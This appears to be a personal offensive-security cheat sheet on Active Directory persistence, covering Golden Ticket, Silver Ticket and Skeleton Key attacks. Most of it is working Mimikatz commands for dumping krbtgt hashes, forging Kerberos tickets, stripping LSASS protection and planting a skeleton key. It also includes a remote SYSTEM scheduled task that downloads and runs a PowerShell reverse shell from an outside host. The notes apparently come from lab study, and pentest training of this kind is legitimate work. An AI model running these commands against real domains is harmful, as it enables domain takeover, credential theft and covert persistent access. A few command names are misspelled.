# Domain Persistence
---
# Navigation
- **[[#Golden Ticket]]**
	- [[#Definition]]
	- [[#Attacking]]
- **[[#Silver Ticket]]**
	- [[#Definition]]
	- [[#Attacking]]
	- [[#Getting a reverse shell]]
- **[[#Skeleton key]]**
	- [[#Attack]]
---
# Golden Ticket
## Definition
A valid **TGT as any user** can be created **using the NTLM hash of the krbtgt AD account**. The advantage of forging a TGT instead of TGS is being **able to access any service** (or machine) in the domain and the impersonated user.
The **krbtgt** account **NTLM hash** can be **obtained** from the **lsass process** or from the **NTDS.dit file** of any DC in the domain.
## Attacking
1. Dumping hashes (Requires DA privilege)
```powershell
#On DC
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
Invoke-Mimikatz -Command '"lsadump::lsa /inject /name:krbtgt"'

#Using DcSync (Quiter)
Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt"'
```
2. Generating the ticket
```powershell
#On any machine
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<DOMAIN-FQDN> /sid:<Domain-SID> /krbtgt:<NTLM> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```
>Note: `/ptt` injects the ticket in the current powershell process (no need to save  the ticket on disk).Alternatively you can use `/ticket` to save the  ticket in a file for later use.

3. Confirm by running `klist` to view cached tickets in memory
```powrshell
klist
```
**Once** you have the **golden Ticket injected**, you can access the shared files **(C$)**, and execute services and WMI, so you could use **psexec** or **wmiexec** to obtain a shell (looks like yo can not get a shell via winrm).

## Further reading
- Explained -> [**Golden-tickets**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- Cheatsheet -> [**Hacktricks**](https://book.hacktricks.xyz/windows/active-directory-methodology/golden-ticket)
--- 
# Silver Ticket
## Definition
The Silver ticket attack is based on **crafting a valid TGS for a service once the NTLM hash of service is owned** (like the **PC account hash**). Thus, it is possible to **gain access to that service** by forging a custom TGS **as any user**.
## Attacking
1. Dumping hashes (Requires DA privilege)
```powershell
#On DC
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
Invoke-Mimikatz -Command '"lsadump::lsa /inject /name:krbtgt"'

#Using DcSync (Quiter)
Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt"'
```
2. Forging the ticket
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /domain:<Domain-FQDN> /sid:<Domain-SID> /rc4:<Service-NTLM> /user:Administrator /service:<SPN> /target:<Target-Computer> /ptt"'
```
> Note:
> `/Service`: is the SPN name of service for which TGS is to be created.
  `/Target`: server hosting the attacked service for which the TGS ticket was cracked.
 
## Getting a reverse shell.

**HOST**  service
```powershell
#Forging TGS 
Invoke-Mimikatz -Command '"kerberos::golden /domain:<Domain-FQDN> /sid:<Domain-SID> /rc4:<Service-NTLM> /user:Administrator /service:HOST /target:<Target-Computer> /ptt"'
#Scheduling task in remote computers
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
> Useful tool: [**Powercat**](https://github.com/besimorhino/powercat)

## Further reading
- Cheatsheet -> [**Hacktricks**](https://book.hacktricks.xyz/windows/active-directory-methodology/silver-ticket)
- Explained -> [**Silver-tickets**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)

# Skeleton key
The Skeleton Key is a particularly scary piece of malware targeted at Active Directory domains to make it alarmingly easy to hijack any account. This malware injects itself into **LSASS** and creates a master password that will work for any account in the domain. Existing passwords will also continue to work, so it is very difficult to know this attack has taken place unless you know what to look for.
## Attack
Requires DA privileges
```powershell
Invoke-Mimikatz -Command '"misc::skeleton"'

# Now you can authenticate as any user with the default password of --> Mimikatz
```
In case lssas is running as a protected process we can still use skeleton key but it needs the mimikatz driver (mimideiv.sys) on disk of the target.
```powershell
mimikatz
privilege::debug
!+
!processprotect /process:lssas.exe /remove
misc::skeleton
!-

#Very Noisy in logs
```
 > **Note:** Rebooting a domain controller will remove this malware and it will have to be redeployed by the attacker.
